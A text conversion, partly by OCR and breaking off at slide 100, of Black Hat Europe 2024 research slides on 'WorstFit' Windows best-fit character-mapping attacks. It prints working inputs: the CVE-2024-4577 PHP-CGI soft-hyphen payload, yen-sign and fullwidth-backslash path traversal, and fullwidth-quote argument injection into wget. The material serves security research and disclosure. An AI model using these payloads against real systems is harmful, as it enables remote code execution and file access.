---
title: "WorstFit Unveiling Hidden Transformers in Windows ANSI"
speakers: ["Orange Tsai", "Splitline Huang"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/Orange Tsai & Splitline Huang_WorstFit Unveiling Hidden Transformers in Windows ANSI.pdf"
pages: 147
sha256: "8d34486bab70aaeba2949656c67860e84b2c06f52b404f92a86b376f1c02d928"
text_chars: 34734
ocr_pages: 42
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:47:54Z"
---
# WorstFit Unveiling Hidden Transformers in Windows ANSI

**Speakers:** Orange Tsai, Splitline Huang  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/Orange Tsai & Splitline Huang_WorstFit Unveiling Hidden Transformers in Windows ANSI.pdf` (147 pages)

## Slide 1

# **BestFit**

Unveiling Hidden Transformers in Windows ANSI! Orange Tsai × Splitline Huang

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
eS 5
We erit
“ —_— <7"
Unveiling Hidden Transformers in Windows ANSI|!
Orange Tsai x Splitline Huang
2)
DE A CORE blackhat
```

## Slide 2

**One Day, I Hacked into a Bank…**

## Slide 3

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BY Windows PowerShell x +\yv
PS C:\Program Files\PostgreSQL\17> .\bin\psql.exe -U postgres
Password for user postgres:
psql (17.2)
Type "help" for help.
postgres=#
```

## Slide 4

$14.50

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BY Windows PowerShell x +Fiv - Oo x
PS C:\Program Files\PostgreSQL\17> .\bin\psql.exe -U postgres
Password for user postgres:
psql (17.2)
Type "help" for help.
postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
```

## Slide 5

SET balance = ' **∞** '

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BY Windows PowerShell x +Fiv Oo
PS C:\Program Files\PostgreSQL\17> .\bin\psql.exe -U postgres
Password for user postgres:
psql (17.2)
Type "help" for help.
postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
name | balance
Grow SET balance = ‘co’ S fox
postgres=# UPDATE accounts [SET balance='«') WHERE name='splitline';
UPDATE 1
postgres=#
```

## Slide 6

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BY Windows PowerShell x +\yv Oo
PS C:\Program Files\PostgreSQL\17> .\bin\psql.exe -U postgres
Password for user postgres:
psql (17.2)
Type "help" for help.
postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
name | balance
ee CE
splitline | 14.50
(1 row)
postgres=# UPDATE accounts SET balance='»' WHERE name='splitline';
UPDATE 1
postgres=# SELECT name, balance FROM accounts WHERE name='splitline' ;
```

## Slide 7

$8

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BY Windows PowerShell x +Fiv Oo
PS C:\Program Files\PostgreSQL\17> .\bin\psql.exe -U postgres
Password for user postgres:
psql (17.2)
Type "help" for help.
postgres=# SELECT name, balance FROM accounts WHERE name='splitline';
name | balance
ee CE
splitline | 14.50
(1 row)
postgres=# UPDATE accounts SET balance='»' WHERE name='splitline';
UPDATE 1
postgres=# SELECT name, balance FROM accounts WHERE name='spLlitline';
name
“splitline |B xR $8 @
(1 row)
```

## Slide 8

$8

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Reconnecting
The connection has been lost. Attempting to
reconnect to your session...
Connection attempt: 1 of 5
```

## Slide 9

DEVCORE Research Team

Orange Tsai

Splitline Huang

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEV CORE Researecn
@ ORANGE TSA!
SOYO6
Seutune Luan
/
```

## Slide 10

貓咪 .TXT

How Windows handles Unicode?

## Slide 11

#### Evolution of Encoding in MS Windows

Since Windows 9x Since Windows 2000
ANSI
UCS-2 UTF-16 UTF-8
Windows Code pages
Since NT 3.1 Since May, 2019
(Obsolete) (Beta)
Windows internal data stores in this way

## Slide 12

#### Evolution of Unicode in MS Windows

Since Windows 9x **ANSI Windows Code pages**

Since Windows 2000

**UCS-2 UTF-16**

**UTF-8**

Since Windows NT Since May, 2019 (Obsolete) (Beta) Windows internal data stores in this way

Since May, 2019 (Beta)

## Slide 13

###### **UTF-16LE**

typedef wchar_t WCHAR; (more…) Console Input Environment Variable File Name Windows Registry Command Line

## Slide 14

UTF-16LE
typedef wchar_t WCHAR;
int main ( int argc,
char *argv [],
(more…)
Console Input char *env p[] )
Environment Variable
File Name
Windows Registry
Command Line

## Slide 15

UTF-16LE
typedef wchar_t WCHAR;
(more…)
Console Input
Environment Variable
File Name
Windows Registry
Command Line

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
getenv, _wgetenv | Microsof x +
G] 23 learn.microsoft.com/en-us/cpp/c-run...
Syntax
char xgetenv(
const char *varname
)e
wchar_t *_wgetenv(
const wchar_t *varname
ye
```

## Slide 16

###### Since Windows 9x

###### Since Windows 2000

**ANSI UCS-2 UTF-16 UTF-8 Windows Code pages** Since NT 3.5 Since May, 2019 (Obsolete) GetEnvironmentVariableAA <u>ANSI</u> Single byte / GetEnvironmentVariableWW <u>Wide char / Unicode</u>

GetEnvironmentVariableAA GetEnvironmentVariableWW

## Slide 17

UTF-16
Windows OS
H e l l o
48 00 65 00 6c 00 6c 00 6f 00
GetEnvironmentVariableW
UTF-16
WCHAR *env="                                           "
H e l l o
48 00 65 00 6c 00 6c 00 6f 00
On Windows code page 1252 (Latin-1)

## Slide 18

UTF-16
Windows OS
H e l l o
48 00 65 00 6c 00 6c 00 6f 00
RtlUnicodeStringToAnsiString
GetEnvironmentVariableA
ANSI
char *env="                                       " H e l l o
48 65 6c 6c 6f

On Windows code page 1252 (Latin-1)

## Slide 19

UTF-16
Windows OS
⁷
√ π ≤ ∞
1a 22 c0 03 77 20 64 22 1e 22
Bes tf i t! RtlUnicodeStringToAnsiString
GetEnvironmentVariableA
ANSI
char *env="                                       " v 7 = 8
p
76 70 37 3d 38

On Windows code page 1252 (Latin-1)

## Slide 20

UTF-16
Windows OS
⁷
√ π ≤ ∞
1a 22 c0 03 77 20 64 22 1e 22
Bes tf i t! RtlUnicodeStringToAnsiString
GetEnvironmentVariableA
ANSI
Wh at is the  " Bestf t i " ?
char *env="                                       " v 7 = 8
p
76 70 37 3d 38

On Windows code page 1252 (Latin-1)

## Slide 21

#### Bestf i t mapping

- Happens when a Unicode string is converted into an ANSI string

- - No specific formula, just make them LOOK alike

- Different code pages map differently! U+00A5 \ (0x5C) CP932 / Japanese Y (0x59) CP1250 / Eastern Europe ¥ ¥ (0xA5) Other code pages Yen Sign

## Slide 22

PHP-CGI Remote Code Execution **CVE-2024-4577**

A bypass of CVE-2012-1823

## Slide 23

PHP-CGI Remote Code Execution **CVE-2024-4577**

A bypass of CVE-2012-1823

## Slide 24

#### CVE-2012-1823

**Exploit!**

http://vuln.host/index.php **?-s** Apache php-cgi.exe -s

$ php-cgi.exe --help ...

-s               Display colour syntax highlighted source.

## Slide 25

#### CVE-2012-1823

http://vuln.host/index.php **?-s** Apache php-cgi.exe -s $ php-cgi.exe --help ... -s               Display colour syntax highlighted source.

## Slide 26

#### CVE-2012-1823

http://vuln.host/index.php **?-s** Apache php-cgi.exe -s if((qs = getenv("QUERY_STRING")) != NULL && strchr(qs, '=') == NULL) { /* ... omitted ... */

for (p = decoded_qs; *p && *p <= ' '; p++) { /* skip leading spaces */ } if (*p == '-') { skip_getopt = 1; }

## Slide 27

#### CVE-2012-1823

http://vuln.host/index.php **?-s** Apache php-cgi.exe -s if((qs = getenv("QUERY_STRING")) != NULL && strchr(qs, '=') == NULL) { /* ... omitted ... */ for (p = decoded_qs; *p s/&& *p **-** <=/' '\xAD; p++) { /* skip leading spaces *//g } if (*p == '-') { skip_getopt = 1; }

## Slide 28

CVE-2024-4577

http://vuln.host/index.php **?%ADs** Apache php-cgi.exe - sAD

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CVE-2024-4577 pg
htto://vuln.host/index.ohp4%ADs
i Ppoene | php-cgi.exe |AD|s
& DB 227.0.0.1:8080/indexphpr%ads x =
< S @  127.0.0.1:8080/index.php?%ads
<?php
if (l!empty($_SERVER[ 'HTTPS']) && (‘'on' == $ SERVER['HTTPS'])) {
$uri. = ‘https://";
} else {
Suri. = "https7/" ;
```

## Slide 29

#### CVE-2024-4577

Browser http://vuln.host/? **%AD** s Soft hyphen Apache php-cgi.exe AD s php-cgi GetCommandLineA() **Bestf i** **t** ↓ Cmdline = php-cgi.exe **-** s

932 | Japanese 936 | Simplified Chinese 950 | Traditional Chinese U+00AD → 0x2D

## Slide 30

**CVE-2024-4577**

However, That was Just **the Tip of the Iceberg**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CVE-2024-4577
However, That was Just
the Tip of the Iceberg
More attack Surfaces!
a
```

## Slide 31

Attack Surfaces **CVE-2024-4577**

**Path / File name**

**Command Line**

**Environment Variable**

**Windows Active Registry Directory**

## Slide 32

#### Attack Surfaces

**Path / File name Environment Variable**

**Command Line Windows Active Registry Directory**

## Slide 33

#### Attack Surfaces

**Path / File name**

**Environment Variable**

**Command Line**

**Windows Active Registry Directory**

## Slide 34

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
W-LUWE...
Lad
FayF14Vv74
‘My Documents’ 0 'G:¥’\
```

## Slide 35

G:¥

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
W-LUWE...
Lad
FayF14Vv74
‘My Documents’ 0 'G:¥’’\
```

## Slide 36

As Same as the Korea Won SIgn (₩)

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Microsoft Windows [Version 10.0. 19045. 5131]
(c) Microsoft Corporation. All rights reserved.
C:¥Users
¥
DEVCORE>
As Same as the Korea Won Slgn (\)
```

## Slide 37

##### ISO 646: **7-Bits** Standard allows National Defined Characters

||**C**|
|---|---|
|**5**||

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ISO 646: 7-Bits Standard allows National
Defined Characters
nc [fs [ww [ow [ne] ve [os [es fo
bet ims Pee Pe Ps PT TT
```

## Slide 38

##### ISO 646-JP: **7-Bits** National Variant for Japanese

||**C**|
|---|---|
|**5**|**¥**|

## Slide 39

ISO 8859-1:  8-Bits  Extension for ISO 646
So-called Latin-1
ISO 646-JP
U+005C → ¥
U+00A5
¥
Yen Sign
ISO 8859-1
U+00A5 → ¥

## Slide 40

_
_
Microsoft
U+005C
U+00A5
¥
¥

## Slide 41

**Let’s     __________ it!**

## Slide 42

..¥ as a filename?

U+00A5

## Slide 43

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vv
File Home Share View
F= Command Prompt - python x Se ||
Microsoft Windows [Version 10.0.19045.5131]
(c) Microsoft Corporation. All rights reserved.
C:\Users\DEVCORE\Desktop>python
Python 2.7.18 (v2.7.18; aa21f2, Apr 20 2020, 13:25:05) [MSC v.
Type "help", "copyrig redits" or "License" for more informa
'
O
>>> os.listdir('.')
```

## Slide 44

> **Bestfit!** � typedef struct _WIN32_FIND_DATAA { DWORD    dwFileAttributes; FILETIME ftCreationTime; FILETIME ftLastAccessTime; ... **CHAR cFileName[MAX_PATH];** };

## Slide 45

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vv
File Home Share View
F= Command Prompt - python x Se ||
Jicrosoft Windows [Version 10.0.19045.5131]
Microsoft Corporation. All rights reserved.
C:\Usrs\DEVCORE\Desktop>python
Python\2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.
Type "help", "copyright", "credits" or "License" for more informa
grt os
1 oy
, 'desktop.ini']
Bei\ eri Ne X
```

## Slide 46

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vv
File Home Share View
ayiyey |
F= Command Prompt - python x Se ||
Microsoft Windows [Version 10.0.19045.5131]
(c) Microsoft Corporation. All rights reserved.
s
C:\Users\DEVCORE\Desktop>p
Python 2.7.18 (v2.7.18:8d2
Type "help", "copyright",
>>> import os
>>> os.listdir('.')
De Xee Nek ine desktop ani:
>>>_os.listdir( os.listdir('.')[0] )
['$Recycle.Bin', 'bootmgr', 'BOOTNXT', 'Documents and Settings',
agefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)',
very', 'secret.txt', 'swapfile.sys', 'System Volume Information' ,
20 2020, 13:25:05) [MSC v.
"License" for more informa
```

## Slide 47

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
v
2
~ Automated Malware Analysis ae
(G £3 cuckoosandbox.org/index.html
About
Being able to understand the way malware
operate is the key to properly fight them. Cuckoo
Sandbox helps you achieving this goal in an easy
and automated fashion.
Malware? Tear it apart, discover its ins and outs and collect
actionable threat data. Cuckoo is the leading open source
automated malware analysis system.
Get Cuckoo!
Download
Cuckoo Sandbox is a completely open source
solution, meaning that you can look at its
internals, modify it and customize it at your will
Go on and download it to start tackling malware.
Read more »
Participate
Cuckoo Sandbox is a community effort. The only
reason of it’s growth and popularity is the people
using it and contributing to it. Get in touch with
the developers and with the users now!
Read more »
```

## Slide 48

At this point we **only fully support Python 2.7** . Older version of Python and Python 3 versions are not supported

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
w §H Requirements — Cuckoo Sa x +
# Cuckoo Sandbox
S
Docs » Installation » Preparing the Host » Requirements © Edit on GitHub
Va
Requirements
atest
Neidalis eleyiaie \v= only fully support Python 2.7) @)lelqis Vass el9)
of Python and Python 8 versions are not supported
distributions)
8 Installation
© Preparing the Host The Cuckoo host components is completely written in Python, therefore it is required to have an
© Requirements appropriate version of Python installed. At this point we only fully support Python 2.7. Older
Installing Python libraries (on version of Python and Python 3 versions are not supported by us (although Python 3 support is on
Ubuntu/Debian-based our TODO list with a low priority).
distributions)
```

## Slide 49

Sandbox Host

Guest VM Guest VM Guest VM

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
cuckoo*: - WwW
Eames) <8 88-65 oa ce
=
Gres VM GIEst VM Guest VM
```

## Slide 50

**WriteFile.exe**

##### **CreateFileW(L"..\u00A5..\u00A5…",…)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
cuckoo*7 #= Recent *§ Pending Q Search Submit Import
SUBMIT URLS/HASHES
Submit URLs/hashes
CreateFileW(L"..\u@@A5. .\u@@AS...”, ...)
syatemninifo Bel] used | tora |
From the press:
FREE DISK SPACE CPU LOAD MEMORY USAGE
```

## Slide 51

**Download**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
cuckoo<7” @ Dashboard Recent *% Pending Q Sea Submit Import
Dropped Files
—_ banca & Download |
Size 6.5KB
Type ASCII text
MD5 a39168f9e20bba2cd67a9cclae3ef6d6
SHA1 371be22301d323f14bca06711918d7b16085cc16
SHA256 £374cada27d8da1556d061147c4b6b82e3f863e5e8ae58c0e8F0a613178979a8
CRC32 B19B56BC
ssdeep None
Yara * vmdetect - Possibly employs anti-virtualization techniques
VirusTotal Search for analysis
Cuckoo Sandbox cuckoo<?” Back to Top
o
oO
7)
©
©
@
)
\
©
2)
Vi)
```

## Slide 52

**_**

**cuckoo.conf _**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
B C:\Users\cuckoo\.cuckoo\conf\cuckoo.conf - Sublime Text (UNREGISTERED)
File Edit Selection Find View Goto Tools Project Preferences Help
4% § cuckoo.conf
[ cuckoo |
# Enable or disable startup version check. When enabled, Cuckoo will connect
# to a remote location to verify whether the running version is the latest
# one available.
version_check = yes
# Cucki + bilities in
= 44cuckoo.conf **
# The authentication token that is required to access the Cuckoo API, using
# HTTP Bearer authentication. This will protect the API instance against
# unauthorized access and CSRF attacks. It is strongly recommended to set this
> # to a secure value.
16) api_token = Zqrzb@Ljk6xNEPh28R1aju
```

## Slide 53

**Cuckoo Sandbox LFI to RCE**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Cuckoo Sandbox LFI to RCE
G
Recycle Bin
coma X=
202U-11-26 10:15:26,142 [cuckoo.core.startup] DEBUG:  |— MongoDB De CAWECOAS RaTONCma ae ascehy
202U-11-26 10:15:26,142 [cuckoo.core.startup] DEBUG I Notification
202U-11-26 10:15:26,142 [cuckoo.core.startup] DEBUG: SingleFile :\sers\cuckoo>agent .py
262U-11-26 10:15:26,144 [cuckoo.core.startup] DEBUG: Checking for Locked tasks
202U-11-26 19:15:26,158 [cuckoo.core.startup] DEBUG: Checking for pending service tasks.
202U-11-26 10:15:26,153 [cuckoo.core.startup] DEBUG: Initializing Yara.
202U-11-26 10:15:26,154 [cuckoo.core.startup] DEBUG:  |— binaries enbedded.yar
202U-11-26 10:15:26,155 [cuckoo.core.startup] DEBUG:  |— binaries shellcodes.yar
202U-11-26 10:15:26,155 [cuckoo.core.startup] DEBUG:  |— binaries vmdetect.yar
262U-11-26 10:15:26,169 [cuckoo] WARNING: It appears that you haven't loaded any Cuckoo S
ignatures. Signatures are highly recommended and improve & enrich the information extract
ed during an analysis. They also make up for the analysis score that you see in the Web I
nterface - so, pretty important!
202U-11-26 10:15:26,169 [cuckoo] WARNING: You'll be able to fetch all the latest Cuckoo S
ignatures, Yara rules, and more goodies by running the following conmand
202U-11-26 10:15:26,161 [cuckoo] INFO: $ cuckoo community
202U-11-26 10:15:26,161 [cuckoo.core.scheduler] INFO: Using "virtualbox" as machine manag
er
262U-11-26 10:15:26,256 [cuckoo.machinery. virtualbox] DEBUG: Stopping vm Win7
202U-11-26 10:15:26,279 [cuckoo.core.scheduler] INFO: Loaded 1 machine/s
202U-11-26 19:15:26,285 [cuckoo.core.scheduler] INFO: Waiting for analysis tasks
1.
orange@DESKTOP-31338:~$ python3 cuckoo-rce.py 192.168.8.137
™)_ orange@DESKTOP-31338:
```

## Slide 54

This is Black Hat Europe Why are you talking about Asian Code Pages?

## Slide 55

- All Code Pages lead to Path Traversal - 874: Thai

- - 1250: Latin 2 / Central European

- - 1251: Cyrillic U+FF3C

- - 1252: Latin 1 / Western European

- - 1253: Greek

- - 1254: Turkish ＼

- - 1255: Hebrew

- - Full Width 1256: Arabic Reverse Solidus

- - 1257: Baltic

   - 1258: Vietnamese

## Slide 56

All Code Pages lead to Path Traversal English, Spanish, French, Dutch, German, Swedish, U+FF3C Italian, Portuguese, Polish, Turkish, U krainian, Greek, Norsk, H ungarian, Russian, ＼ Czech, Romanian, Bulgarian, Vietnamese, T hai, Filipino, Full Width Reverse Solidus Malay, Indonesian, Arabic, Urdu, Persian, Swahili…

## Slide 57

_Who are  ?_
afected by f f i lename smuggling

## Slide 58

Tips for mitigations: Switch to **Traditional Chinese** __

## Slide 59

#### Attack Surfaces

**Path / File name**

**Environment Variable**

**Command Line**

Windows  Active
Registry Directory

## Slide 60

import subprocess subprocess.run(

['wget.exe', f'http://example.tld/{ <u>USER_PROVIDED_INPUT}</u> .txt'] )

On an **English** -configured Windows OS What could go wrong here

## Slide 61

import subprocess subprocess.run(

['wget.exe', f'http://example.tld/{USE R_PROVIDED_INP & calc.exe & UT}.txt'] )

EaSy pEaSy

## Slide 62

<u>https://docs.python.org/3/library</u> <u>/</u> **<u>subprocess</u>** <u>. html#security-considerations</u>

import subprocess subprocess.run(

['wget.exe', f'http://example.tld/{US ER_PROVIDED_INPUT " ; calc.exe ; " }.txt']

)

~~EaSy pEaSy~~

## Slide 63

>>> subprocess.run(["wget.exe", f'http://example.tld/ & calc & .txt']) --2024-12-03 12:34:56-- http://example.tld/ **<u>%20&%20calc%20&%20.txt</u>** import subprocess Resolving example.tld (example.tld)... 8.8.8.8 Connecting to example.tld (example.tld)|8.8.8.8|:80... connected.subprocess.run( ...omitted... ['wget.exe', f'http://example.tld/{U SER_PROVIDED_IN " & calc.exe & PUT" }.txt'] )

So, Nope. (not surprisingly)

## Slide 64

import subprocess subprocess.run(

['wget.exe', f'http://example.tld/{U SER_PROVIDED_INPUT " --use-askpass=calc " }.txt'] )

And for sure, this won’t work…

## Slide 65

import subprocess subprocess.run(

['wget.exe', f'http://example.tld/{ USER_PROVIDED_INPUT ＂ --use-askpass=calc ＂ }.txt'] )

How about **THIS** ?

## Slide 66

import subprocess subprocess.run(

['wget.exe', f'http://example.tld/{ USER_PROVIDED_INPUT ＂ --use-askpass=calc ＂ }.txt'] )

Easy Peasy

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BB Windows PowerShell
Ps C:\> python
Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit CAMD6
4)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import subprocess
process.run(['wget.exe', f'http://example.tld/" --use-askpass=calc " .txt'])
rom command "calc Username for 'http://example.tld': ": No s
~
wget.exe', 'http://example.tld/" --use-askpass=calc " .txt!
import sul
subproces
[ ‘wget
L}
Easy Peasy de
```

## Slide 67

94.87% CAN’T FIND THE DIFFERENCE!!. Difficulty: ★★★★★

**Exploit Safe Install Now!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
94.87% CANT FIND THE DIFFERENCE!
CU: KK KKKK
B® Windows PowerShell
PS C:\> python
Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022
, 23:13:41) [MSC v.1929 64 bit CAMD64)] on win32
Type "help", "copyright", "credits" or "License"
for more information.
>>> subprocess.run(['wget.exe', f'http://example
.tld/" --use-askpass=cale " .txt'])
PS C:\> python
Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022
, 23:13:41) [MSC v.1929 64 bit CAMD64)] on win32
Type "help", "copyright", "credits" or "License"
for more information.
>>> subprocess.run(['wget.exe', f'http://example
.tld/" --use-askpass=calc ".txt'])
```

## Slide 68

### 94.87% CAN’T FIND THE DIFFERENCE!!.

Difficulty: ★★★★★

**Exploit**

**Safe**

**Install Now!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BY Windows PowerShell x |
PS C:\> python
Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022
, 23:13:41) [MSC v.1929 64 bit CAMD64)] on win32
Type "help", "copyright", "credits" or "License"
for more information.
>>> subprocess.run(['wget.exe', f'http://example
.tld/" --use-askpass=cale " .txt'])
PS C:\> python
Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022
, 23:13:41) [MSC v.1929 64 bit CAMD64)] on win32
Type "help", "copyright", "credits" or "License"
for more information.
>>> subprocess.run(['wget.exe', f'http://example
.tld/" --use-askpass=calc ".txt'])
Exploit @
Safe &
```

## Slide 69

### 94.87% CAN’T FIND THE DIFFERENCE!!.

Difficulty: ★★★★★

**U+FF02** **<u>Fullwidth quotation mark</u>**

**U+0022 Quotation mark**

**Exploit**

**Safe**

**Install Now!**

## Slide 70

### 94.87% CAN’T FIND THE DIFFERENCE!!.

Difficulty: ★★★★★

**U+FF02 U+0022** **<u>Fullwidth quotation mark</u> Quotation mark**

**Exploit**

**Safe**

**Install Now!**

## Slide 71

wget example.tld/home -O "out.txt"

How is this parsed?

## Slide 72

On **Unix-like** systems

wget example.tld/home -O "out.txt"

Parsed by your shell (e.g. /bin/sh)

argv[] = {"wget","example.tld/home","-O","out.txt"}

execve(" **/bin/wget** ", **argv[]** , envp **)** New process /bin/wget with argv[]

## Slide 73

On **Windows** system

wget example.tld/home -O "out.txt"

CreateProcess(LPCSTR lpApplicationName, LPSTR lpCommandLine, ...)

## Slide 74

On **Windows** system

wget example.tld/home -O "out.txt"

CreateProcess("C:\\Program Files\\Wget\\wget.exe", "wget example.tld/home -O \"out.txt\"", ...)

New Process running **<u>wget.exe</u>**

Cmdline = GetCommandLine() Args[] = CommandLineToArgv(Cmdline) argv[] = {"wget", "example.tld/home", "-O", "out.txt"}

## Slide 75

run(['wget.exe', 'example.tld/\uFF02--use-askpass=calc\uFF02.txt'])

## Slide 76

run(['wget.exe', 'example.tld/\uFF02--use-askpass=calc\uFF02.txt'])

Try to convert Python list to a command line string

## Slide 77

run(['wget.exe', 'example.tld/ʺ--use-askpass=calcʺ.txt']) No double quote nor backslash, no need to escape :) Exe     = C:\wget.exe Cmdline = wget.exe "example.tld/ʺ --use-askpass=calc ʺ.txt"

## Slide 78

run(['wget.exe', 'example.tld/ʺ--use-askpass=calcʺ.txt'])

No double quote nor backslash, no need to escape :) Exe     = C:\wget.exe Cmdline = wget.exe "example.tld/ʺ --use-askpass=calc ʺ.txt"

Mm-hmm, pass it to wget.exe

**Wget** GetCommandLineA()

## Slide 79

run(['wget.exe', 'example.tld/ʺ--use-askpass=calcʺ.txt']) No double quote nor backslash, no need to escape :) Exe     = C:\wget.exe Cmdline = wget.exe "example.tld/ʺ --use-askpass=calc ʺ.txt" Mm-hmm, pass it to wget.exe

**Wget** GetCommandLineA()

**Bestf i** **t** [ANSI] What is ʺ? idk, but **<u>Bestfit</u>** says ʺ is actually a " Cmdline = wget.exe "example.tld/" --use-askpass=calc ".txt"

## Slide 80

#### We found many such bugs!

- Java ● OpenSSL

- Perl

   - Subversion (SVN)

- tar (Windows built-in)

   - Perforce

- curl (Author build)

   - PostgreSQL

- wget

   - Plink on Putty

- Bzip2 ● XZ Utils

There must be more in the wild

## Slide 81

#### We found many such bugs!

- Java ● OpenSSL

- Perl

- Perl ● Subversion (SVN)

- **● tar (Windows built-in)** ● Perforce

- ●

- curl (Author build) PostgreSQL

- **Case Study!** ●

- wget Plink on Putty

- Bzip2 ● XZ Utils

There must be more in the wild

## Slide 82

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
©) Studio-42/elFinder:@ Open x + v
ws) Studio-42 / elFinder Q Type (7) to search Fes} +-~ © % €B <a>
<> Code © Issues 6 11 Pullrequests 3 Q) Discussions © Actions ) wiki © Security 3 lx Insights
elFinder Public @ Watch 237 + Y Fork 1.4k . yy Star 4.7k a
¥ master ~ | Y9| @ if) Demo:elFinder - Web FileMa xX = +
e nao-pon Fix #363)
github e | Fi n d e r Code
file manager for web
© Star © Fork
Issues Wiki Discussion
css
1,419
files
elFinder 2.1.x, please report bugs here or send your translation.
img
php » __ Basic Auth Example Downloads Videos MIME types README.md Images Basic Auth
> @® Downloads Example
=
> ® Images ] Aa
MIME types |Aa.
Setup with composer Tips Setup with — Welcome(Multiling
_ composer ual)
> ips
```

## Slide 83

But arguments are all escaped by escapeshellarg!

It executes command for creating archive

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
16
6892
6904
6905
6906
6907
6908
6909
6910
6911
6912
6913
6914
eo1ic
abstract class elFinderVolumeDriWer
But arguments are all escaped
by escapeshellarg!
protected function makeArchfive($dir, $files, $name, $arc)
$files = array_ma (‘escapeshellarg',! $files);
$prefix = $switch = ;— — ——7
// The zip command accepts the "—" at the beginning of the file name as command switch,
// and can't use '--' before archive name, so add "./" to name for secyYrity reasons.
if ($arc['ext'] === 'zip' && strpos($arc['argc'], '-tzip') === false) /{
$prefix = './';
$switch = '—- ';
$cmd = $arc['cmd'] . ' ‘ . $arc["argc’] . ' * . $prefix Wentaresieeinratcanar) |. ' ' . $switch . implode(' ', $files);
outs _ sss TT
otisseprocexec{ $end, $o, $c, $err_out, $dir); |
It executes command for creating archive
```

## Slide 84

But arguments are all escaped by escapeshellarg! **All Escaped…** tar.exe -chf " NewTar.tar" " .\file1" " .\file2" ... **But tar.exe is vulnerable to WorstFit!** It executes command for creating archive

## Slide 85

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BZ Windows PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements! https://
PS C:\Users\splitline>
2r.htmii#elf_l1_Lw
Folder is empty
Drop to add items
```

## Slide 86

###### RStudio w/ SVN

###### TortoiseGit w/ Plink

Of course, more CALC.EXEs are popped!

## Slide 87

###### **NO programming language can stop this attack!**

Command::new("program.exe").arg(argument) Rus t subprocess.run(["program.exe", arg]) Python child_process.spawn('program.exe', [argument]) Node.js exec.Command("program.exe", args...) Golang

proc_open(['program.exe', $arg])

PHP

shell_exec('program.exe '.escapeshellarg(arg));

## Slide 88

#### Afected Code Pages f

- 874: Thai

- - 1250: Latin 2 / Central European

- - 1251: Cyrillic U+FF02

- - 1252: Latin 1 / Western European ＂

- - 1253: Greek

- - 1254: Turkish

- - 1255: Hebrew

- - Full Width 1256: Arabic Quotation Mark

- - 1257: Baltic

- - 1258: Vietnamese

## Slide 89

##### Mitigation?

Switch to **<u>CJK Language</u>** __ Chinese, Japanese, Korean

## Slide 90

## Mitigation? Hold On! Switch to **<u>CJK Language</u>**

Chinese, Japanese, Korean

## Slide 91

¥  and  ₩ Japanese Korean Yen Sign Won Sign 0x5C (\)

## Slide 92

['program.exe','foo¥" bar'] )

subprocess.run(

Python

## Slide 93

)

CreateProcessW( Escape the double quote "program.exe", ↓ program.exe  "foo¥\" bar"

argv[1]

Windows

## Slide 94

##### **Bestf i** **t!**

Escape the next backslash ↓

GetCommandLineA() = ↓ program.exe  "foo **\** \" bar"

argv[1] argv[2]

program.exe

## Slide 95

_ _
Who are afected by argument splitting? f

## Slide 96

Mitigation? Switch to **~~CJK Language~~** 。 **Chinese**

## Slide 97

**New Text Document.txt**

## Slide 98

**How does Windows know which executable to use to open this file?**

**New Text Document.txt**

## Slide 99

C:\>assoc ... **.txt=txtfile** ... C:\>ftype ... txtfile= <u>%SystemRoot%\system32\NOTEPAD.EXE %1</u> ...

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
C:\>assoc
.txt=txtfile
C:\>ftype
txtfile=%SystemRoot%\system32\NOTEPAD. EXE | 41
```

## Slide 100

NOTEPAD.EXE <FILENAME>

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
